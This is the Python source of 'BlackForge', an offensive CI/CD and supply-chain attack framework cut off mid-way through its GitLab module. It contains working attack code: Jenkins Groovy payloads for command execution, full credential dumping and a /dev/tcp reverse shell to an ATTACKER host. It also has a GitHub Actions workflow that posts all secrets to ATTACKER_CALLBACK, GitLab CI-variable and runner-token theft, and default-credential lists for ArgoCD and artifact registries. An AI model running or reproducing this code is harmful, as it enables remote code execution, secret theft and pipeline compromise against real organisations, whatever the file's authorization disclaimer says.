#!/usr/bin/env python3
"""
BlackForge Framework
=====================
Author      : arkanzasfeziii
License     : MIT
Version     : 1.0.0
Description : CI/CD & Supply Chain attack framework for authorized red team engagements.
              Covers: GitHub Actions exploitation, Jenkins RCE & credential dump,
              GitLab pipeline injection, ArgoCD compromise, artifact repository attacks,
              and supply chain dependency confusion.

              Aligned with MITRE ATT&CK:
                T1195 Supply Chain Compromise | T1552 Unsecured Credentials
                T1059 Command/Script Interpreter | T1078 Valid Accounts

WARNING: For AUTHORIZED penetration testing and red team engagements ONLY.
Unauthorized use is ILLEGAL. Obtain written authorization before use.
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import re
import sys
import textwrap
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    REQUESTS = True
except ImportError:
    REQUESTS = False

try:
    import pyfiglet
    PYFIGLET = True
except ImportError:
    PYFIGLET = False


# ── Constants ──────────────────────────────────────────────────────────────────

TOOL_NAME = "BlackForge Framework"
VERSION   = "1.0.0"
AUTHOR    = "arkanzasfeziii"
COMMAND   = "blackforge"

LEGAL_WARNING = """
╔══════════════════════════════════════════════════════════════════════════════╗
║        ⚠   BLACKFORGE — AUTHORIZED RED TEAM USE ONLY   ⚠                   ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  This framework executes REAL CI/CD attacks: GitHub Actions secret theft,   ║
║  Jenkins Groovy RCE, GitLab pipeline injection, ArgoCD compromise, artifact ║
║  repository credential harvest, and supply chain dependency confusion.      ║
║                                                                              ║
║  Requirements before use:                                                   ║
║    ✓ Written authorization from the target organization                     ║
║    ✓ Defined scope (repos / CI platforms / registries)                      ║
║    ✓ Rules of engagement signed off                                         ║
║                                                                              ║
║  The author (arkanzasfeziii) accepts NO LIABILITY for misuse.               ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

GITHUB_API    = "https://api.github.com"
TIMEOUT       = 15
DEFAULT_DELAY = 0.5

# Jenkins endpoints
JENKINS_PATHS = {
    "who_am_i":    "/whoAmI/api/json",
    "credentials": "/credentials/store/system/domain/_/api/json?depth=2",
    "jobs":        "/api/json?tree=jobs[name,url,buildable,builds[number,result]]",
    "script":      "/scriptText",
    "crumb":       "/crumbIssuer/api/json",
    "build_queue": "/queue/api/json",
    "users":       "/asynchPeople/api/json",
    "nodes":       "/computer/api/json",
}

JENKINS_GROOVY_PAYLOADS: Dict[str, str] = {
    "whoami": "println(['id'].execute().text)",
    "hostname": "println(['hostname'].execute().text)",
    "env_dump": "System.getenv().each { println it }",
    "cred_dump": """
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
import jenkins.model.Jenkins

def creds = CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.Credentials.class, Jenkins.instance, null, null)
creds.each { c ->
    try {
        println("ID: ${c.id} | TYPE: ${c.class.simpleName} | DESC: ${c.description}")
        if (c.hasProperty('username')) println("  USER: ${c.username}")
        if (c.hasProperty('password')) println("  PASS: ${c.password}")
        if (c.hasProperty('secret'))   println("  SECRET: ${c.secret}")
        if (c.hasProperty('apiToken')) println("  TOKEN: ${c.apiToken}")
        if (c.hasProperty('privateKeySource')) println("  KEY: ${c.privateKeySource.privateKey}")
    } catch (e) {}
}
""",
    "aws_env": "println(System.getenv('AWS_ACCESS_KEY_ID') + ':' + System.getenv('AWS_SECRET_ACCESS_KEY'))",
    "read_file": "println(new File('/etc/passwd').text)",
    "reverse_shell": "['bash','-c','bash -i >& /dev/tcp/ATTACKER/4444 0>&1'].execute()",
}

# GitLab API paths
GITLAB_PATHS = {
    "projects":   "/api/v4/projects?membership=true&per_page=100",
    "groups":     "/api/v4/groups?per_page=100",
    "users":      "/api/v4/users?per_page=100",
    "runners":    "/api/v4/runners/all",
    "vars":       "/api/v4/projects/{id}/variables",
    "ci_vars":    "/api/v4/groups/{id}/variables",
    "pipeline":   "/api/v4/projects/{id}/pipelines",
    "jobs":       "/api/v4/projects/{id}/jobs",
}

# ArgoCD API paths
ARGOCD_PATHS = {
    "info":      "/api/v1/version",
    "apps":      "/api/v1/applications",
    "clusters":  "/api/v1/clusters",
    "repos":     "/api/v1/repositories",
    "settings":  "/api/v1/settings",
}
ARGOCD_DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", ""),
    ("admin", "argocd"), ("admin", "Admin123"), ("root", "root"),
]

# Artifact repository paths
ARTIFACT_PATHS: Dict[str, List[str]] = {
    "nexus":       ["/service/rest/v1/repositories",
                    "/service/rest/v1/assets?repository=maven-central",
                    "/service/rest/v1/security/users",
                    "/#browse/browse:browse"],
    "artifactory": ["/api/system/info",
                    "/api/repositories",
                    "/api/security/users",
                    "/ui/"],
    "harbor":      ["/api/v2.0/systeminfo",
                    "/api/v2.0/projects",
                    "/api/v2.0/users",
                    "/"],
}
ARTIFACT_DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "Admin1234"),
    ("admin", "Nexus1234"), ("admin", "Harbor12345"), ("root", "root"),
]

SECRET_PATTERNS = [
    (r"AKIA[0-9A-Z]{16}", "AWS_ACCESS_KEY"),
    (r"AIza[0-9A-Za-z\-_]{35}", "GOOGLE_API_KEY"),
    (r"ghp_[0-9a-zA-Z]{36}", "GITHUB_PAT"),
    (r"glpat-[0-9a-zA-Z\-_]{20}", "GITLAB_PAT"),
    (r"sk-[a-zA-Z0-9]{48}", "OPENAI_KEY"),
    (r"(?i)password\s*[:=]\s*['\"]([^'\"\s]{8,})['\"]", "PASSWORD"),
    (r"(?i)(api[_-]?key|apikey)\s*[:=]\s*['\"]?([a-zA-Z0-9\-_\.]{20,})", "API_KEY"),
    (r"(?i)(secret|token)\s*[:=]\s*['\"]([^\s'\"]{16,})['\"]", "SECRET"),
    (r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----", "PRIVATE_KEY"),
    (r"(?i)connectionString\s*=\s*\"([^\"]+)\"", "CONNECTION_STRING"),
    (r"(?i)(access[_-]?token|bearer)\s*[:=]\s*['\"]([^\s'\"]{20,})['\"]", "ACCESS_TOKEN"),
]


# ── Dataclasses ────────────────────────────────────────────────────────────────

@dataclass
class AttackResult:
    module:   str
    action:   str
    status:   str
    target:   str = ""
    data:     Any = None
    severity: str = "INFO"
    notes:    str = ""

@dataclass
class Credential:
    type:   str
    value:  Dict[str, str]
    source: str
    notes:  str = ""

@dataclass
class EngagementContext:
    results:     List[AttackResult] = field(default_factory=list)
    credentials: List[Credential]   = field(default_factory=list)
    loot:        Dict[str, Any]      = field(default_factory=dict)
    delay:       float = DEFAULT_DELAY
    session:     Any   = None

    def __post_init__(self) -> None:
        if REQUESTS:
            self.session = requests.Session()
            self.session.verify = False


# ── Helpers ────────────────────────────────────────────────────────────────────

def _log(msg: str, level: str = "INFO") -> None:
    colors = {"INFO":"\033[36m","OK":"\033[32m","WARN":"\033[33m",
              "ERR":"\033[31m","CRIT":"\033[35m"}
    reset = "\033[0m"
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"{colors.get(level,'')}{ts} [{level}] {msg}{reset}")

def _req(ctx: EngagementContext, method: str, url: str,
         **kwargs: Any) -> Optional[Any]:
    if not REQUESTS:
        return None
    try:
        time.sleep(ctx.delay)
        return ctx.session.request(method, url, timeout=TIMEOUT,
                                   allow_redirects=False, **kwargs)
    except Exception:
        return None

def _scan_secrets(text: str) -> List[Dict[str, str]]:
    found = []
    for pattern, label in SECRET_PATTERNS:
        for m in re.finditer(pattern, str(text), re.MULTILINE | re.DOTALL):
            val = m.group(0) if not m.groups() else (m.group(1) or m.group(0))
            if len(val) > 200:
                val = val[:200]
            found.append({"type": label, "value": val})
    return found


# ── Module 1: GitHub Attacks ───────────────────────────────────────────────────

class GitHubModule:
    """GitHub: enumerate repos/Actions, extract secrets from logs, inject workflows."""

    def run(self, ctx: EngagementContext, token: str = "",
            org: str = "", repo: str = "") -> List[AttackResult]:
        if not REQUESTS:
            return [AttackResult("github", "setup", "FAILED",
                                 notes="pip install requests")]
        results = []
        hdrs = {"Authorization": f"token {token}", "Accept": "application/vnd.github.v3+json"} if token else {}
        ctx.loot.setdefault("github", {})

        results.extend(self._verify_token(ctx, hdrs))
        if org:
            results.extend(self._enum_org(ctx, hdrs, org))
        if repo:
            results.extend(self._enum_repo(ctx, hdrs, repo))
            results.extend(self._enum_actions(ctx, hdrs, repo))
            results.extend(self._scan_workflow_files(ctx, hdrs, repo))
            results.extend(self._enum_actions_logs(ctx, hdrs, repo))
            results.extend(self._check_workflow_inject(ctx, hdrs, repo))
        results.extend(self._check_public_secret_leaks(ctx, hdrs, org or repo))
        return results

    def _verify_token(self, ctx: EngagementContext, hdrs: Dict) -> List[AttackResult]:
        if not hdrs:
            return []
        resp = _req(ctx, "GET", f"{GITHUB_API}/user", headers=hdrs)
        if resp and resp.status_code == 200:
            data = resp.json()
            _log(f"[GitHub] Token valid: {data.get('login')} | Scopes: {resp.headers.get('X-OAuth-Scopes','')}", "OK")
            ctx.loot["github"]["identity"] = {
                "login": data.get("login"), "id": data.get("id"),
                "scopes": resp.headers.get("X-OAuth-Scopes", ""),
                "type": data.get("type"),
            }
            return [AttackResult("github", "token_verify", "SUCCESS",
                                 data=ctx.loot["github"]["identity"],
                                 severity="INFO",
                                 notes=f"Authenticated as {data.get('login')} | Scopes: {resp.headers.get('X-OAuth-Scopes','')}")]
        return []

    def _enum_org(self, ctx: EngagementContext, hdrs: Dict,
                   org: str) -> List[AttackResult]:
        # Enumerate repos
        resp = _req(ctx, "GET", f"{GITHUB_API}/orgs/{org}/repos?per_page=100&type=all", headers=hdrs)
        if not resp or resp.status_code != 200:
            return []
        repos = resp.json()
        ctx.loot["github"]["repos"] = [{"name": r["name"], "private": r["private"],
                                         "default_branch": r["default_branch"]} for r in repos]
        _log(f"[GitHub] {org}: {len(repos)} repos ({sum(1 for r in repos if r['private'])} private)", "INFO")

        # Enumerate members
        resp_m = _req(ctx, "GET", f"{GITHUB_API}/orgs/{org}/members?per_page=100", headers=hdrs)
        members = resp_m.json() if resp_m and resp_m.ok else []
        ctx.loot["github"]["members"] = [m["login"] for m in members]

        # Check org secrets
        resp_s = _req(ctx, "GET", f"{GITHUB_API}/orgs/{org}/actions/secrets", headers=hdrs)
        org_secrets = []
        if resp_s and resp_s.ok:
            org_secrets = [s["name"] for s in resp_s.json().get("secrets", [])]
            _log(f"[GitHub] Org secrets (names): {org_secrets}", "WARN")

        ctx.loot["github"]["org_secrets"] = org_secrets
        return [AttackResult("github", "org_enum", "SUCCESS", target=org,
                             data={"repos": len(repos), "members": len(members),
                                   "org_secrets": org_secrets},
                             severity="HIGH" if org_secrets else "INFO",
                             notes=f"{org}: {len(repos)} repos, {len(members)} members, "
                                   f"{len(org_secrets)} org-level secrets (names only visible)")]

    def _enum_repo(self, ctx: EngagementContext, hdrs: Dict,
                    repo: str) -> List[AttackResult]:
        results = []
        resp = _req(ctx, "GET", f"{GITHUB_API}/repos/{repo}", headers=hdrs)
        if not resp or not resp.ok:
            return []
        info = resp.json()
        ctx.loot["github"]["repo_info"] = {
            "name": info.get("full_name"), "private": info.get("private"),
            "default_branch": info.get("default_branch"),
            "has_pages": info.get("has_pages"),
        }
        # Repo-level secrets
        resp_s = _req(ctx, "GET", f"{GITHUB_API}/repos/{repo}/actions/secrets", headers=hdrs)
        repo_secrets = []
        if resp_s and resp_s.ok:
            repo_secrets = [s["name"] for s in resp_s.json().get("secrets", [])]
            _log(f"[GitHub] Repo secrets ({repo}): {repo_secrets}", "WARN")
        ctx.loot["github"]["repo_secrets"] = repo_secrets
        results.append(AttackResult("github", "repo_secrets", "SUCCESS", target=repo,
                                    data={"secrets": repo_secrets},
                                    severity="HIGH" if repo_secrets else "INFO",
                                    notes=f"Repo has {len(repo_secrets)} secrets. "
                                          f"Names: {repo_secrets}. Extract via workflow injection."))
        return results

    def _enum_actions(self, ctx: EngagementContext, hdrs: Dict,
                       repo: str) -> List[AttackResult]:
        resp = _req(ctx, "GET", f"{GITHUB_API}/repos/{repo}/actions/workflows", headers=hdrs)
        if not resp or not resp.ok:
            return []
        workflows = resp.json().get("workflows", [])
        ctx.loot["github"]["workflows"] = [{"name": w["name"], "path": w["path"],
                                              "state": w["state"]} for w in workflows]
        _log(f"[GitHub] {len(workflows)} workflows in {repo}", "INFO")
        return [AttackResult("github", "workflows_enum", "INFO", target=repo,
                             data={"count": len(workflows), "workflows": ctx.loot["github"]["workflows"]},
                             notes=f"{len(workflows)} GitHub Actions workflows. Check for injection vectors.")]

    def _scan_workflow_files(self, ctx: EngagementContext, hdrs: Dict,
                              repo: str) -> List[AttackResult]:
        """Download and scan workflow YAML files for injection vectors."""
        results = []
        resp = _req(ctx, "GET", f"{GITHUB_API}/repos/{repo}/contents/.github/workflows", headers=hdrs)
        if not resp or not resp.ok:
            return []
        files = resp.json() if isinstance(resp.json(), list) else []
        injection_findings = []

        for f in files:
            if not f["name"].endswith((".yml", ".yaml")):
                continue
            file_resp = _req(ctx, "GET", f["download_url"], headers=hdrs)
            if not file_resp or not file_resp.ok:
                continue
            content = file_resp.text

            # Check for injection vectors
            inject_patterns = [
                (r"\$\{\{\s*github\.event\.", "github.event user input → injection"),
                (r"\$\{\{\s*github\.head_ref", "github.head_ref branch name injection"),
                (r"\$\{\{\s*github\.event\.pull_request\.title", "PR title injection"),
                (r"run:\s*.*\$\{\{\s*github\.event", "Direct injection in run: step"),
                (r"\$\{\{\s*env\.", "Env var used in run step"),
            ]
            for pattern, desc in inject_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    injection_findings.append({
                        "file": f["name"], "pattern": pattern, "desc": desc,
                        "snippet": re.search(pattern, content, re.IGNORECASE).group(0),
                    })
                    _log(f"[GitHub] Workflow injection: {f['name']} — {desc}", "CRIT")

            # Scan for hardcoded secrets in workflow
            secrets = _scan_secrets(content)
            for s in secrets:
                _log(f"[GitHub] Secret in workflow: {f['name']} — {s['type']}", "CRIT")
                ctx.credentials.append(Credential(
                    s["type"], {"value": s["value"]},
                    f"github:workflow:{repo}/{f['name']}",
                    f"Hardcoded {s['type']} in workflow file",
                ))

        if injection_findings:
            ctx.loot["github"]["workflow_injections"] = injection_findings
            results.append(AttackResult(
                "github", "workflow_injection", "SUCCESS", target=repo,
                severity="CRITICAL",
                data=injection_findings,
                notes=f"{len(injection_findings)} workflow injection vectors found. "
                      f"Craft malicious PR/push to execute arbitrary commands and steal secrets.",
            ))
        return results

    def _enum_actions_logs(self, ctx: EngagementContext, hdrs: Dict,
                            repo: str) -> List[AttackResult]:
        """Scan recent Actions workflow run logs for leaked secrets."""
        resp = _req(ctx, "GET", f"{GITHUB_API}/repos/{repo}/actions/runs?per_page=10", headers=hdrs)
        if not resp or not resp.ok:
            return []
        runs = resp.json().get("workflow_runs", [])
        log_secrets: List[Dict] = []

        for run in runs[:5]:
            run_id = run["id"]
            log_resp = _req(ctx, "GET", f"{GITHUB_API}/repos/{repo}/actions/runs/{run_id}/logs", headers=hdrs)
            if log_resp and log_resp.status_code == 200:
                log_text = log_resp.text[:50000]
                for s in _scan_secrets(log_text):
                    log_secrets.append({"run_id": run_id, "type": s["type"], "value": s["value"][:100]})
                    _log(f"[GitHub] Secret in run log #{run_id}: {s['type']}", "CRIT")
                    ctx.credentials.append(Credential(
                        s["type"], {"value": s["value"]},
                        f"github:actions_log:{repo}#{run_id}",
                    ))
            elif log_resp and log_resp.status_code == 302:
                # Redirect to zip — follow it
                zip_resp = _req(ctx, "GET", log_resp.headers.get("Location", ""), headers=hdrs)
                if zip_resp and zip_resp.ok:
                    for s in _scan_secrets(zip_resp.text[:50000]):
                        log_secrets.append({"run_id": run_id, **s})

        return [AttackResult("github", "log_secret_scan", "SUCCESS" if log_secrets else "INFO",
                             target=repo, severity="CRITICAL" if log_secrets else "INFO",
                             data={"secrets_found": log_secrets},
                             notes=f"Scanned {len(runs)} run logs. {len(log_secrets)} secrets found.")]

    def _check_workflow_inject(self, ctx: EngagementContext, hdrs: Dict,
                                repo: str) -> List[AttackResult]:
        """Generate PoC workflow that exfiltrates all secrets via PR comment."""
        poc_workflow = """# BlackForge Proof-of-Concept — Secrets Exfiltration via Workflow Injection
# Inject via PR if github.event.pull_request.title is used unsanitized in run: steps

name: ci
on: [pull_request]
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: Dump all secrets
        run: |
          curl -s -X POST "https://ATTACKER_CALLBACK/" \\
            -d "secrets=${{ toJSON(secrets) }}&env=$(env | base64)"
        env:
          ALL_SECRETS: ${{ toJSON(secrets) }}
"""
        return [AttackResult("github", "workflow_inject_poc", "PARTIAL", target=repo,
                             data={"poc": poc_workflow[:200]},
                             severity="HIGH",
                             notes="PoC workflow generated. To exploit: fork repo, create PR with "
                                   "malicious branch name or commit message if input is unsanitized.")]

    def _check_public_secret_leaks(self, ctx: EngagementContext,
                                    hdrs: Dict, scope: str) -> List[AttackResult]:
        if not scope or not hdrs:
            return []
        # GitHub Secret Scanning API
        resp = _req(ctx, "GET",
                    f"{GITHUB_API}/repos/{scope}/secret-scanning/alerts?state=open",
                    headers=hdrs)
        if resp and resp.ok:
            alerts = resp.json() if isinstance(resp.json(), list) else []
            if alerts:
                _log(f"[GitHub] {len(alerts)} open secret scanning alerts!", "CRIT")
                return [AttackResult("github", "secret_scanning_alerts", "SUCCESS",
                                     target=scope, severity="CRITICAL",
                                     data={"count": len(alerts),
                                           "alerts": [{"type": a.get("secret_type"),
                                                        "url": a.get("html_url")} for a in alerts[:10]]},
                                     notes=f"{len(alerts)} exposed secrets detected by GitHub Secret Scanning")]
        return []


# ── Module 2: Jenkins ─────────────────────────────────────────────────────────

class JenkinsModule:
    """Jenkins: anonymous access, Groovy RCE, credential dump, job enumeration."""

    def run(self, ctx: EngagementContext, url: str,
            username: str = "", password: str = "",
            token: str = "") -> List[AttackResult]:
        if not REQUESTS:
            return [AttackResult("jenkins", "setup", "FAILED", notes="pip install requests")]
        results = []
        base = url.rstrip("/")
        ctx.loot.setdefault("jenkins", {})

        auth = (username, password or token) if username else None
        results.extend(self._check_access(ctx, base, auth))
        results.extend(self._enum_jobs(ctx, base, auth))
        results.extend(self._groovy_rce(ctx, base, auth))
        results.extend(self._dump_credentials(ctx, base, auth))
        results.extend(self._enum_nodes(ctx, base, auth))
        return results

    def _check_access(self, ctx: EngagementContext, base: str,
                       auth: Optional[Tuple]) -> List[AttackResult]:
        resp = _req(ctx, "GET", f"{base}/api/json", auth=auth)
        if not resp:
            return [AttackResult("jenkins", "connect", "FAILED", target=base,
                                 notes="Cannot connect")]
        anon_resp = _req(ctx, "GET", f"{base}/api/json")
        if anon_resp and anon_resp.ok:
            _log(f"[Jenkins] ANONYMOUS ACCESS! {base}", "CRIT")
            data = anon_resp.json()
            ctx.loot["jenkins"]["anon_info"] = data
            return [AttackResult("jenkins", "anon_access", "SUCCESS", target=base,
                                 severity="CRITICAL",
                                 data={"version": resp.headers.get("X-Jenkins","?")},
                                 notes=f"Jenkins at {base} allows anonymous access")]
        if resp.ok:
            return [AttackResult("jenkins", "auth_access", "INFO", target=base,
                                 notes="Authenticated access granted")]
        return [AttackResult("jenkins", "access_denied", "FAILED", target=base,
                             notes=f"HTTP {resp.status_code}")]

    def _get_crumb(self, ctx: EngagementContext, base: str,
                    auth: Optional[Tuple]) -> Optional[Dict[str, str]]:
        resp = _req(ctx, "GET", f"{base}/crumbIssuer/api/json", auth=auth)
        if resp and resp.ok:
            data = resp.json()
            return {data["crumbRequestField"]: data["crumb"]}
        return {}

    def _groovy_rce(self, ctx: EngagementContext, base: str,
                     auth: Optional[Tuple]) -> List[AttackResult]:
        results = []
        crumb = self._get_crumb(ctx, base, auth)
        hdrs  = {**(crumb or {}), "Content-Type": "application/x-www-form-urlencoded"}

        # Test RCE with whoami
        resp = _req(ctx, "POST", f"{base}/scriptText", auth=auth,
                    headers=hdrs,
                    data={"script": JENKINS_GROOVY_PAYLOADS["whoami"]})
        if resp and resp.ok and resp.text.strip():
            output = resp.text.strip()
            _log(f"[Jenkins] Groovy RCE! whoami={output}", "CRIT")
            ctx.loot["jenkins"]["rce"] = {"whoami": output}
            results.append(AttackResult("jenkins", "groovy_rce", "SUCCESS", target=base,
                                        severity="CRITICAL",
                                        data={"whoami": output},
                                        notes=f"Groovy script console RCE confirmed. Running as: {output}. "
                                              f"Use --jenkins-cmd to execute arbitrary commands."))
            # Dump env
            env_resp = _req(ctx, "POST", f"{base}/scriptText", auth=auth,
                            headers=hdrs,
                            data={"script": JENKINS_GROOVY_PAYLOADS["env_dump"]})
            if env_resp and env_resp.ok:
                env_text = env_resp.text[:3000]
                env_secrets = _scan_secrets(env_text)
                for s in env_secrets:
                    _log(f"[Jenkins] Secret in env: {s['type']}", "CRIT")
                    ctx.credentials.append(Credential(
                        s["type"], {"value": s["value"]},
                        f"jenkins:env:{base}", "From Jenkins environment variables"))
                ctx.loot["jenkins"]["env"] = env_text[:1000]
        else:
            results.append(AttackResult("jenkins", "groovy_rce", "FAILED", target=base,
                                        notes="Groovy script console not accessible (403) or locked down"))
        return results

    def _dump_credentials(self, ctx: EngagementContext, base: str,
                           auth: Optional[Tuple]) -> List[AttackResult]:
        crumb = self._get_crumb(ctx, base, auth)
        hdrs  = {**(crumb or {}), "Content-Type": "application/x-www-form-urlencoded"}

        resp = _req(ctx, "POST", f"{base}/scriptText", auth=auth,
                    headers=hdrs,
                    data={"script": JENKINS_GROOVY_PAYLOADS["cred_dump"]})
        if resp and resp.ok and resp.text.strip():
            cred_text = resp.text
            _log(f"[Jenkins] Credential dump output:\n{cred_text[:300]}", "CRIT")
            ctx.loot["jenkins"]["credentials_dump"] = cred_text[:2000]

            # Parse credentials
            for line in cred_text.split("\n"):
                if "PASS:" in line or "SECRET:" in line or "TOKEN:" in line:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        ctx.credentials.append(Credential(
                            "jenkins_credential",
                            {"field": parts[0].strip(), "value": parts[1].strip()[:200]},
                            f"jenkins:credentials:{base}",
                        ))
            return [AttackResult("jenkins", "cred_dump", "SUCCESS", target=base,
                                 severity="CRITICAL",
                                 data={"output": cred_text[:500]},
                                 notes=f"Jenkins credentials dumped via Groovy. {len(ctx.credentials)} extracted.")]
        # Fallback: check credentials REST API
        resp2 = _req(ctx, "GET", f"{base}/credentials/store/system/domain/_/api/json?depth=2",
                     auth=auth)
        if resp2 and resp2.ok:
            data = resp2.json()
            creds = data.get("credentials", [])
            return [AttackResult("jenkins", "cred_api", "PARTIAL", target=base,
                                 data={"credentials": [c.get("id") for c in creds]},
                                 notes=f"{len(creds)} credentials found via API (values hidden). "
                                       f"Use Groovy console to extract: --groovy-payload cred_dump")]
        return [AttackResult("jenkins", "cred_dump", "FAILED", target=base,
                             notes="No Groovy RCE access — credentials not extractable")]

    def _enum_jobs(self, ctx: EngagementContext, base: str,
                    auth: Optional[Tuple]) -> List[AttackResult]:
        resp = _req(ctx, "GET", f"{base}/api/json?tree=jobs[name,url,buildable,color]",
                    auth=auth)
        if not resp or not resp.ok:
            return []
        jobs = resp.json().get("jobs", [])
        ctx.loot["jenkins"]["jobs"] = [{"name": j["name"], "url": j.get("url","")} for j in jobs]
        _log(f"[Jenkins] {len(jobs)} jobs found", "INFO")
        return [AttackResult("jenkins", "jobs_enum", "INFO", target=base,
                             data={"count": len(jobs), "jobs": [j["name"] for j in jobs[:20]]},
                             notes=f"{len(jobs)} Jenkins jobs. Check pipeline scripts for secrets.")]

    def _enum_nodes(self, ctx: EngagementContext, base: str,
                     auth: Optional[Tuple]) -> List[AttackResult]:
        resp = _req(ctx, "GET", f"{base}/computer/api/json", auth=auth)
        if not resp or not resp.ok:
            return []
        computers = resp.json().get("computer", [])
        nodes = [{"name": c.get("displayName"), "offline": c.get("offline"),
                   "num_exec": c.get("numExecutors")} for c in computers]
        ctx.loot["jenkins"]["nodes"] = nodes
        return [AttackResult("jenkins", "nodes_enum", "INFO", target=base,
                             data={"count": len(nodes), "nodes": nodes},
                             notes=f"{len(nodes)} Jenkins nodes (agents). "
                                   f"Each node may have credentials and host access.")]


# ── Module 3: GitLab ─────────────────────────────────────────────────────────

class GitLabModule:
    """GitLab: CI/CD variable dump, runner token theft, pipeline injection."""

    def run(self, ctx: EngagementContext, url: str,
            token: str = "", username: str = "", password: str = "") -> List[AttackResult]:
        if not REQUESTS:
            return [AttackResult("gitlab", "setup", "FAILED", notes="pip install requests")]
        results = []
        base = url.rstrip("/")
        hdrs = {"PRIVATE-TOKEN": token} if token else {}
        ctx.loot.setdefault("gitlab", {})

        results.extend(self._verify_access(ctx, base, hdrs, token))
        results.extend(self._enum_projects(ctx, base, hdrs))
        results.extend(self._dump_ci_vars(ctx, base, hdrs))
        results.extend(self._steal_runner_tokens(ctx, base, hdrs))
        results.extend(self._scan_pipeline_logs(ctx, base, hdrs))
        return results

    def _verify_access(self, ctx: EngagementContext, base: str,
                        hdrs: Dict, token: str) -> List[AttackResult]:
        resp = _req(ctx, "GET", f"{base}/api/v4/user", headers=hdrs)
        if resp and resp.ok:
            data = resp.json()
            ctx.loot["gitlab"]["identity"] = data
            _log(f"[GitLab] Authenticated as {data.get('username')} ({data.get('name')})", "OK")
            is_admin = data.get("is_admin", False)
            if is_admin:
                _log("[GitLab] ADMIN TOKEN!", "CRIT")
            return [AttackResult("gitlab", "token_verify", "SUCCESS",
                                 data={"username": data.get("username"), "is_admin": is_admin},
                                 severity="CRITICAL" if is_admin else "INFO",
                                 notes=f"Authenticated as {data.get('username')}"
                                       + (" [ADMIN]" if is_admin else ""))]
        # Check for anonymous access
        resp2 = _req(ctx, "GET", f"{base}/api/v4/projects?visibility=public")
        if resp2 and resp2.ok:
            return [AttackResult("gitlab", "anon_access", "INFO",
                                 notes="GitLab allows anonymous API access")]
        return [AttackResult("gitlab", "connect", "FAILED", notes="Cannot authenticate")]

    def _enum_projects(self, ctx: EngagementContext, base: str,
                        hdrs: Dict) -> List[AttackResult]:
        resp = _req(ctx, "GET", f"{base}/api/v4/projects?membership=true&per_page=100",
                    headers=hdrs)
        if not resp or not resp.ok:
            return []
        projects = resp.json() if isinstance(resp.json(), list) else []
        ctx.loot["gitlab"]["projects"] = [
            {"id": p["id"], "name": p["path_with_namespace"],
             "visibility": p.get("visibility")} for p in projects]
        _log(f"[GitLab] {len(projects)} accessible projects", "INFO")
        return [AttackResult("gitlab", "projects_enum", "INFO",
                             data={"count": len(projects),
                                   "projects": [p["path_with_namespace"] for p in projects[:20]]},
                             notes=f"{len(projects)} projects accessible")]

    def _dump_ci_vars(self, ctx: EngagementContext, base: str,
                       hdrs: Dict) -> List[AttackResult]:
        results = []
        all_vars = []
        for project in ctx.loot.get("gitlab", {}).get("projects", [])[:20]:
            pid = project["id"]
            resp = _req(ctx, "GET", f"{base}/api/v4/projects/{pid}/variables",
                        headers=hdrs)
            if resp and resp.ok:
                vars_list = resp.json() if isinstance(resp.json(), list) else []
                for var in vars_list:
                    var_info = {
                        "project": project["name"], "key": var.get("key"),
                        "value": var.get("value", "")[:200],
                        "protected": var.get("protected"),
                        "masked": var.get("masked"),
                    }
                    all_vars.append(var_info)
                    # If not masked, value is visible
                    if not var.get("masked"):
                        secrets = _scan_secrets(var.get("value",""))
                        for s in secrets:
                            _log(f"[GitLab] Secret CI var: {project['name']}.{var['key']}: {s['type']}", "CRIT")
                            ctx.credentials.append(Credential(
                                s["type"], {"key": var["key"], "value": s["value"]},
                                f"gitlab:ci_var:{project['name']}", "CI/CD variable"))
        ctx.loot["gitlab"]["ci_vars"] = all_vars
        visible = [v for v in all_vars if not v.get("masked")]
        results.append(AttackResult("gitlab", "ci_var_dump", "SUCCESS" if all_vars else "INFO",
                                    severity="CRITICAL" if visible else "HIGH",
                                    data={"total": len(all_vars), "visible": len(visible)},
                                    notes=f"{len(all_vars)} CI variables, {len(visible)} unmasked (values readable)"))
        return results

    def _steal_runner_tokens(self, ctx: EngagementContext, base: str,
                              hdrs: Dict) -> List[AttackResult]:
        # Admin only: list all runners with tokens
        resp = _req(ctx, "GET", f"{base}/api/v4/runners/all?per_page=100", headers=hdrs)
        if not resp or not resp.ok:
            return []
        runners = resp.json() if isinstance(resp.json(), list) else []
        runner_tokens = []
        for runner in runners[:10]:
            rid = runner["id"]
            detail_resp = _req(ctx, "GET", f"{base}/api/v4/runners/{rid}", headers=hdrs)
            if detail_resp and detail_resp.ok:
                detail = detail_resp.json()
                token = detail.get("token", "")
                if token:
                    runner_tokens.append({
                        "id": rid, "description": detail.get("description", ""),
                        "token": token, "ip": detail.get("ip_address", ""),
                        "online": detail.get("online"),
                    })
                    _log(f"[GitLab] Runner token: {detail.get('description','?')} | {token}", "CRIT")
                    ctx.credentials.append(Credential(
                        "gitlab_runner_token", {"token": token, "runner_id": str(rid)},
                        f"gitlab:runner:{rid}",
                        f"Register your own runner with this token to intercept jobs",
                    ))
        ctx.loot["gitlab"]["runner_tokens"] = runner_tokens
        return [AttackResult("gitlab", "runner_tokens", "SUCCESS" if runner_tokens else "INFO",
                             severity="CRITICAL" if runner_tokens else "INFO",
                             data={"count": len(runner_tokens), "tokens": runner_tokens},
                             notes=f"{len(runner_tokens)} runner tokens stolen. "
                                   f"Register rogue runner to intercept CI jobs and steal secrets.")]

    def _scan_pipeline_logs(self, ctx: EngagementContext, base: str,
                              hdrs: Dict) -> List[AttackResult]:
        log_findings = []
        for project in ctx.loot.get("gitlab", {}).get("projects", [])[:5]:
            pid = project["id"]
            # Get recent jobs
